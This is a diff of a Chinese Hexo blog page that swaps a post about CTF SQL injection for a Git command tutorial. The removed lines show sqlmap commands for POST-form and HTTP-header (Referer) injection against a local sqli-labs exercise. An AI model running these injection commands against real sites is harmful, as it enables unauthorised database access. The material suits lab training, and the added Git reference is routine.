-<p>利用sqlmap进行post注入有几种方式</p>
-<p><strong>1.普通的表单注入</strong></p>
-<p>在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加<code>--forms</code>命令参数</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --forms --batch</code></pre><p><strong>2.带参数的表单注入</strong></p>
-<p>如果已知某个参数有注入漏洞，如”id=1&amp;time=2001”</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --data “id=1&amp;time=2001” --batch</code></pre><p><strong>3.使用文件指定参数的表单（HTTP头）注入</strong></p>
-<p>比如已知注入点为id，在post表单中</p>
-<p>用Burpsuite抓包，把报头保存为<code>post.txt</code>，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）</p>
-<pre><code>sqlmap &gt; py sqlmap.py -r post.txt -p id --dbs --batch     //用-p参数指定注入点
-或者
-sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别，level 3级别就会自动探测http头</code></pre><p>要在http头中进行注入，只要在需要探测的字段后面添加一个<code>*</code>号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个<code>*</code>号。</p>
-<pre><code>Referer: http://127.0.0.1/sqli/Less-19/*</code></pre><p><strong>4.使用Burpsuite带sqlmap插件注入</strong></p>
-<p>很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。</p>
-<h2 id="GET报错注入"><a href="#GET报错注入" class="headerlink" title="GET报错注入"></a>GET报错注入</h2><script>
+<p>理解这些名词，在脑中形成知识体系，便于理解下面具体命令。</p>
+<h2 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h2><h3 id="创建SSH-Key"><a href="#创建SSH-Key" class="headerlink" title="创建SSH Key"></a>创建SSH Key</h3><pre class="line-numbers language-bash"><code class="language-bash">$ ssh-keygen -t rsa -C <span class="token string">"youremail@example.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="关于仓库"><a href="#关于仓库" class="headerlink" title="关于仓库"></a>关于仓库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 在当前目录新建一个Git代码库</span>
+$ <span class="token function">git</span> init
+
+<span class="token comment" spellcheck="true"># 新建一个目录，将其初始化为Git代码库</span>
+$ <span class="token function">git</span> init <span class="token punctuation">[</span>project-name<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 下载一个项目和它的整个代码历史</span>
+$ <span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加/删除文件"></a>增加/删除文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加指定文件到暂存区</span>
+$ <span class="token function">git</span> add <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.
+
+<span class="token comment" spellcheck="true"># 添加指定目录到暂存区，包括子目录</span>
+$ <span class="token function">git</span> add <span class="token punctuation">[</span>dir<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 添加当前目录的所有文件到暂存区</span>
+$ <span class="token function">git</span> add <span class="token keyword">.</span>
+
+<span class="token comment" spellcheck="true"># 添加每个变化前，都会要求确认</span>
+<span class="token comment" spellcheck="true"># 对于同一个文件的多处变化，可以实现分次提交</span>
+$ <span class="token function">git</span> add -p
+
+<span class="token comment" spellcheck="true"># 删除工作区文件，并且将这次删除放入暂存区</span>
+$ <span class="token function">git</span> <span class="token function">rm</span> <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.
+
+<span class="token comment" spellcheck="true"># 停止追踪指定文件，但该文件会保留在工作区</span>
+$ <span class="token function">git</span> <span class="token function">rm</span> --cached <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 改名文件，并且将这个改名放入暂存区</span>
+$ <span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file-original<span class="token punctuation">]</span> <span class="token punctuation">[</span>file-renamed<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 提交暂存区到仓库区</span>
+$ <span class="token function">git</span> commit -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 提交暂存区的指定文件到仓库区</span>
+$ <span class="token function">git</span> commit <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>. -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 提交工作区自上次commit之后的变化，直接到仓库区</span>
+$ <span class="token function">git</span> commit -a
+
+<span class="token comment" spellcheck="true"># 提交时显示所有diff信息</span>
+$ <span class="token function">git</span> commit -v
+
+<span class="token comment" spellcheck="true"># 使用一次新的commit，替代上一次提交</span>
+<span class="token comment" spellcheck="true"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span>
+$ <span class="token function">git</span> commit --amend -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 重做上一次commit，并包括指定文件的新变化</span>
+$ <span class="token function">git</span> commit --amend <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 列出所有本地分支</span>
+$ <span class="token function">git</span> branch
+
+<span class="token comment" spellcheck="true"># 列出所有远程分支</span>
+$ <span class="token function">git</span> branch -r
+
+<span class="token comment" spellcheck="true"># 列出所有本地分支和远程分支</span>
+$ <span class="token function">git</span> branch -a
+
+<span class="token comment" spellcheck="true"># 新建一个分支，但依然停留在当前分支</span>
+$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 新建一个分支，并切换到该分支</span>
+$ <span class="token function">git</span> checkout -b <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 新建一个分支，指向指定commit</span>
+$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 新建一个分支，与指定的远程分支建立追踪关系</span>
+$ <span class="token function">git</span> branch --track <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 切换到指定分支，并更新工作区</span>
+$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 切换到上一个分支</span>
+$ <span class="token function">git</span> checkout -
+
+<span class="token comment" spellcheck="true"># 建立追踪关系，在现有分支与指定的远程分支之间</span>
+$ <span class="token function">git</span> branch --set-upstream-to<span class="token operator">=</span>origin/<span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 合并指定分支到当前分支</span>
+$ <span class="token function">git</span> merge <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 选择一个commit，合并进当前分支</span>
+$ <span class="token function">git</span> cherry-pick <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 删除分支</span>
+$ <span class="token function">git</span> branch -d <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 删除远程分支</span>
+$ <span class="token function">git</span> push origin --delete <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>
+$ <span class="token function">git</span> branch -dr <span class="token punctuation">[</span>remote/branch<span class="token punctuation">]</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 列出所有tag</span>
+$ <span class="token function">git</span> tag
+
+<span class="token comment" spellcheck="true"># 新建一个tag在当前commit</span>
+$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 新建一个tag在指定commit</span>
+$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 删除本地tag</span>
+$ <span class="token function">git</span> tag -d <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 删除远程tag</span>
+$ <span class="token function">git</span> push origin :refs/tags/<span class="token punctuation">[</span>tagName<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 查看tag信息</span>
+$ <span class="token function">git</span> show <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 提交指定tag</span>
+$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 提交所有tag</span>
+$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --tags
+
+<span class="token comment" spellcheck="true"># 新建一个分支，指向某个tag</span>
+$ <span class="token function">git</span> checkout -b <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 显示有变更的文件</span>
+$ <span class="token function">git</span> status
+
+<span class="token comment" spellcheck="true"># 显示当前分支的版本历史</span>
+$ <span class="token function">git</span> log
+
+<span class="token comment" spellcheck="true"># 显示commit历史，以及每次commit发生变更的文件</span>
+$ <span class="token function">git</span> log --stat
+
+<span class="token comment" spellcheck="true"># 搜索提交历史，根据关键词</span>
+$ <span class="token function">git</span> log -S <span class="token punctuation">[</span>keyword<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示某个commit之后的所有变动，每个commit占据一行</span>
+$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD --pretty<span class="token operator">=</span>format:%s
+
+<span class="token comment" spellcheck="true"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span>
+$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD --grep feature
+
+<span class="token comment" spellcheck="true"># 显示某个文件的版本历史，包括文件改名</span>
+$ <span class="token function">git</span> log --follow <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+$ <span class="token function">git</span> whatchanged <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示指定文件相关的每一次diff</span>
+$ <span class="token function">git</span> log -p <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示过去5次提交</span>
+$ <span class="token function">git</span> log -5 --pretty --oneline
+
+<span class="token comment" spellcheck="true"># 显示所有提交过的用户，按提交次数排序</span>
+$ <span class="token function">git</span> shortlog -sn
+
+<span class="token comment" spellcheck="true"># 显示指定文件是什么人在什么时间修改过</span>
+$ <span class="token function">git</span> blame <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示暂存区和工作区的差异</span>
+$ <span class="token function">git</span> <span class="token function">diff</span>
+
+<span class="token comment" spellcheck="true"># 显示暂存区和上一个commit的差异</span>
+$ <span class="token function">git</span> <span class="token function">diff</span> --cached <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示工作区与当前分支最新commit之间的差异</span>
+$ <span class="token function">git</span> <span class="token function">diff</span> HEAD
+
+<span class="token comment" spellcheck="true"># 显示两次提交之间的差异</span>
+$ <span class="token function">git</span> <span class="token function">diff</span> <span class="token punctuation">[</span>first-branch<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>second-branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示今天你写了多少行代码</span>
+$ <span class="token function">git</span> <span class="token function">diff</span> --shortstat <span class="token string">"@{0 day ago}"</span>
+
+<span class="token comment" spellcheck="true"># 显示某次提交的元数据和内容变化</span>
+$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示某次提交发生变化的文件</span>
+$ <span class="token function">git</span> show --name-only <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示某次提交时，某个文件的内容</span>
+$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>:<span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示当前分支的最近几次提交</span>
+$ <span class="token function">git</span> reflog
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 下载远程仓库的所有变动</span>
+$ <span class="token function">git</span> fetch <span class="token punctuation">[</span>remote<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 显示所有远程仓库</span>
+$ <span class="token function">git</span> remote -v
+
+<span class="token comment" spellcheck="true"># 显示某个远程仓库的信息</span>
+$ <span class="token function">git</span> remote show <span class="token punctuation">[</span>remote<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 增加一个新的远程仓库，并命名</span>
+$ <span class="token function">git</span> remote add <span class="token punctuation">[</span>shortname<span class="token punctuation">]</span> <span class="token punctuation">[</span>url<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 取回远程仓库的变化，并与本地分支合并</span>
+$ <span class="token function">git</span> pull <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 上传本地指定分支到远程仓库</span>
+$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 强行推送当前分支到远程仓库，即使有冲突</span>
+$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --force
+
+<span class="token comment" spellcheck="true"># 推送所有分支到远程仓库</span>
+$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --all
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 恢复暂存区的指定文件到工作区</span>
+$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 恢复某个commit的指定文件到暂存区和工作区</span>
+$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>commit<span class="token punctuation">]</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 恢复暂存区的所有文件到工作区</span>
+$ <span class="token function">git</span> checkout <span class="token keyword">.</span>
+
+<span class="token comment" spellcheck="true"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span>
+$ <span class="token function">git</span> reset <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 重置暂存区与工作区，与上一次commit保持一致</span>
+$ <span class="token function">git</span> reset --hard
+
+<span class="token comment" spellcheck="true"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span>
+$ <span class="token function">git</span> reset <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span>
+$ <span class="token function">git</span> reset --hard <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span>
+$ <span class="token function">git</span> reset --keep <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 新建一个commit，用来撤销指定commit</span>
+<span class="token comment" spellcheck="true"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span>
+$ <span class="token function">git</span> revert <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># 暂时将未提交的变化移除，稍后再移入</span>
+$ <span class="token function">git</span> stash
+$ <span class="token function">git</span> stash pop
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h2><h3 id="help命令"><a href="#help命令" class="headerlink" title="help命令"></a>help命令</h3><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/img/image-20210202221721129.png" alt="image-20210202221721129"></p>
+<h3 id="status命令"><a href="#status命令" class="headerlink" title="status命令"></a>status命令</h3><p>当你不知道该怎么的时候，就可以<code>git status</code>一下，他就会提示展示出当前文件状态以及给出建议，这样就不会懵逼了&gt;_&gt;</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1007,7 +1019,7 @@ sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别�
                     </span>
                     <a href="https://liloong3t.com" class="b-link-green">Liloong3t的博客</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2021/01/16/2021-1-16-sql-shou-gong-zhu-ru/" class="b-link-green">ctf手工SQL注入</a>
+                    <a href="/2021/02/02/2021-2-2-git-chang-yong-ming-ling-yu-jiao-cheng/" class="b-link-green">Git常用命令与教程</a>
                 </p>
             </div>
 
@@ -1030,7 +1042,7 @@ sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别�
         repo: 'LiGuHeiYi.github.io',
         owner: 'LiGuHeiYi',
         admin: ["LiGuHeiYi"],
-        id: '2021/01/16/2021-1-16-sql-shou-gong-zhu-ru/',
+        id: '2021/02/02/2021-2-2-git-chang-yong-ming-ling-yu-jiao-cheng/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1051,80 +1063,29 @@ sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/01/21/2021-1-21-mysql-chang-yong-ji-chu-yu-fa/">
+                <a href="/2021/02/02/2021-2-2-git-chang-yong-ming-ling-yu-jiao-cheng/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="MYSQL常用基础语法">
+                        <img src="/medias/banner/wlop.jpg" class="responsive-img" alt="Git常用命令与教程">
                         
-                        <span class="card-title">MYSQL常用基础语法</span>
+                        <span class="card-title">Git常用命令与教程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            MySQL常用基础语法Younger_zeng 2018-08-02 17:20:23  https://blog.csdn.net/qq_36969257/article/details/81364113
-MySQL语法[TOC]
-MyS
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/blog/" class="post-category" target="_blank">
-                                    blog
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web，mysql/" target="_blank">
-                        <span class="chip bg-color">web，mysql</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/01/14/2021-1-14-ban-ben-kong-zhi-xi-tong-xin-xi-xie-lu-fen-xi/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="版本控制系统信息泄露分析">
-                        
-                        <span class="card-title">版本控制系统信息泄露分析</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            版本控制系统信息泄露分析.svn文件.svn文件是 Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。
-黑客可以
+                            Git中有很多常用的命令，掌握好常用的命令就能事半功倍。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-14
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-02
                             </span>
                         <span class="publish-author">
                             
@@ -1138,15 +1099,77 @@ MyS
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/" target="_blank">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/Git/" target="_blank">
+                        <span class="chip bg-color">Git</span>
                     </a>
                     
-                    <a href="/tags/ctf/" target="_blank">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/教程/" target="_blank">
+                        <span class="chip bg-color">教程</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/02/01/2021-2-1-chong-jian-bo-ke/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="重建博客">
+                        
+                        <span class="card-title">重建博客</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            倒腾了一两天把个人博客网站重建了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续慢慢更新玩玩。至于为什么重建博客，这要从一个协会博客开始说起了，不过我也早就看不惯原来那个jkyll模板的博客了，功能过于简陋。这两天解决这些破问题还顺便速成了一下git。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                    blog
+                                </a>
+                            
+                            <a href="/categories/blog/安装与配置/" class="post-category" target="_blank">
+                                    安装与配置
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Hexo/" target="_blank">
+                        <span class="chip bg-color">Hexo</span>
+                    </a>
+                    
+                    <a href="/tags/Github/" target="_blank">
+                        <span class="chip bg-color">Github</span>
+                    </a>
+                    
+                    <a href="/tags/blog/" target="_blank">
+                        <span class="chip bg-color">blog</span>
                     </a>
                     
                 </div>
